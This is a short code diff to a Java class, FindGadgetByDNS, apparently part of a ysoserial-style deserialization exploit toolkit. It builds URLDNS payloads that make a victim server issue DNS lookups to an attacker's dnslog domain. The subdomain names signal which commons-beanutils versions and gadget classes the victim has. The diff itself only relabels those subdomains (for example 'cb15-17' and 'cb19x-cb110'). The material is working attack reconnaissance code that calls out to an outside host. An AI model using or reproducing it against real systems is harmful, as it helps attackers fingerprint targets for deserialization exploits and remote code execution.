@@ -117,9 +117,9 @@ public class FindGadgetByDNS implements ObjectPayload<Object> {
                 break;
             case "CommonsBeanutils2":
                 //CommonsBeanutils2链,serialVersionUID不同,1.7x-1.8x为-3490850999041592962,1.9x为-2044202215314119608
-                HashMap cb17 = getURLDNSgadget("http://cb17."+dnslog, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
+                HashMap cb17 = getURLDNSgadget("http://cb15-17."+dnslog, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
                 HashMap cb18x = getURLDNSgadget("http://cb18x."+dnslog, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
-                HashMap cb19x = getURLDNSgadget("http://cb19x."+dnslog, "org.apache.commons.beanutils.BeanIntrospectionData");
+                HashMap cb19x = getURLDNSgadget("http://cb19x-cb110."+dnslog, "org.apache.commons.beanutils.BeanIntrospectionData");
                 list.add(cb17);
                 list.add(cb18x);
                 list.add(cb19x);
